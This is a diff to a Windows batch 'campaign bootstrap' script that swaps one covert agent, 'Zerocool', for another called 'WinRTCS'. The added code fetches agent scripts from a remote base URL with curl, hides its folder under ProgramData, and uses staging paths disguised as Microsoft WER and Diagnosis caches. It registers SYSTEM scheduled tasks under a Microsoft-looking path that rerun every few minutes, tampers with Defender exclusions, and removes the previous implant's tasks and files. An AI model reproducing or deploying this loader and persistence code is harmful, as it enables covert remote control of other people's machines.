@@ -1,9 +1,10 @@
 @echo off
-rem CAMPAIGN_SCRIPT ZEROCOOL_BOOTSTRAP B1 - wipe every legacy project artifact, install Zerocool v0.0.1.
-rem Safe to re-run. Delivered by M71 campaign hook or manual paste. Keeps sevrz/gryxa RMM clients untouched.
-rem Order matters: verify new agent FIRST (abort = legacy stack untouched), then wipe, then arm.
+rem CAMPAIGN_SCRIPT WINRTCS_BOOTSTRAP B1 - wipe every legacy project artifact + retire Zerocool bridge, install WinRTCS v0.0.1.
+rem Safe to re-run. Delivered by M71 campaign hook, Zerocool 0.0.2 bridge payload, or manual paste.
+rem Keeps sevrz/gryxa RMM clients untouched. Order: verify new agent FIRST, then wipe, then arm, then retire Zerocool.
 setlocal EnableExtensions EnableDelayedExpansion
-set "ZD=C:\ProgramData\Zerocool"
+set "ZD=C:\ProgramData\WinRTCS"
+set "ZC=C:\ProgramData\Zerocool"
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -13,19 +14,19 @@ set "LOG=%ZD%\bootstrap.log"
 echo [%DATE% %TIME%] bootstrap_begin host=%COMPUTERNAME%>>"%LOG%"
 
 rem --- 1) fetch + verify agent/stager/version BEFORE touching anything ---
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%ZD%\zerocool.version" "%BASE%/zerocool.version?t=%RANDOM%%RANDOM%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\zerocool_agent.cmd" "%BASE%/zerocool_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\zerocool_run.cmd" "%BASE%/zerocool_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%ZD%\winrtcs.version" "%BASE%/winrtcs.version?t=%RANDOM%%RANDOM%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\winrtcs_agent.cmd" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\winrtcs_run.cmd" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
 set "AGENT_SHA="
-if exist "%ZD%\zerocool.version" for /f "usebackq tokens=1,* delims==" %%K in ("%ZD%\zerocool.version") do if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
+if exist "%ZD%\winrtcs.version" for /f "usebackq tokens=1,* delims==" %%K in ("%ZD%\winrtcs.version") do if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
 if not defined AGENT_SHA goto :Abort
-if not exist "%ZD%\zerocool_agent.cmd" goto :Abort
-if not exist "%ZD%\zerocool_run.cmd" goto :Abort
-call :Sha256 "%ZD%\zerocool_agent.cmd" BOOT_SHA
+if not exist "%ZD%\winrtcs_agent.cmd" goto :Abort
+if not exist "%ZD%\winrtcs_run.cmd" goto :Abort
+call :Sha256 "%ZD%\winrtcs_agent.cmd" BOOT_SHA
 if /I not "!BOOT_SHA!"=="!AGENT_SHA!" goto :Abort
-findstr /C:"ZEROCOOL_AGENT" "%ZD%\zerocool_agent.cmd" >nul 2>&1
+findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
 if errorlevel 1 goto :Abort
-findstr /C:"ZEROCOOL_RUN" "%ZD%\zerocool_run.cmd" >nul 2>&1
+findstr /C:"WINRTCS_RUN" "%ZD%\winrtcs_run.cmd" >nul 2>&1
 if errorlevel 1 goto :Abort
 echo [%DATE% %TIME%] agent_verified>>"%LOG%"
 
@@ -53,22 +54,34 @@ for %%P in ("%WD%" "%ETL%" "%SystemRoot%\Temp\.upd" "%SystemRoot%\Temp\.wucache"
 for %%X in (msiexec.exe curl.exe cmd.exe powershell.exe certutil.exe) do reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%X" /f >nul 2>&1
 echo [%DATE% %TIME%] defender_reverted>>"%LOG%"
 
-rem --- 5) wipe legacy dirs (agent first-run finishes .upd, where the campaign copy of this script lives) ---
+rem --- 5) wipe legacy dirs (agent first-run finishes .upd, where a campaign copy of this script lives) ---
 rmdir /s /q "%WD%" >nul 2>&1
 rmdir /s /q "%ETL%" >nul 2>&1
 rmdir /s /q "%SystemRoot%\Temp\.wucache" >nul 2>&1
 echo [%DATE% %TIME%] legacy_dirs_removed>>"%LOG%"
 
-rem --- 6) arm Zerocool ---
+rem --- 6) arm WinRTCS ---
 attrib +h "%ZD%" >nul 2>&1
-set "TASKA=\Microsoft\Windows\Zerocool\Agent"
-set "TASKG=\Microsoft\Windows\Zerocool\Guard"
-set "ACT=cmd.exe /c C:\ProgramData\Zerocool\zerocool_run.cmd"
+set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
+set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
+set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
 schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 7 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 schtasks /Run /TN "%TASKA%" >nul 2>&1
-echo [%DATE% %TIME%] zerocool_armed>>"%LOG%"
-echo ZEROCOOL_BOOTSTRAP=OK
+echo [%DATE% %TIME%] winrtcs_armed>>"%LOG%"
+
+rem --- 7) retire Zerocool bridge: tasks first (kills any in-flight run), then wipe its dir ---
+schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Agent" /F >nul 2>&1
+schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Guard" /F >nul 2>&1
+timeout /t 8 /nobreak >nul 2>&1
+for /l %%I in (1,1,3) do (
+  rmdir /s /q "%ZC%" >nul 2>&1
+  if not exist "%ZC%" goto :ZcGone
+  timeout /t 3 /nobreak >nul 2>&1
+)
+:ZcGone
+echo [%DATE% %TIME%] zerocool_retired>>"%LOG%"
+echo WINRTCS_BOOTSTRAP=OK
 endlocal & exit /b 0
 
 :KillTask
@@ -80,7 +93,7 @@ exit /b 0
 
 :Abort
 echo [%DATE% %TIME%] ABORT agent_unverified - legacy stack untouched>>"%LOG%"
-echo ZEROCOOL_BOOTSTRAP=FAIL
+echo WINRTCS_BOOTSTRAP=FAIL
 endlocal & exit /b 9
 
 :Sha256
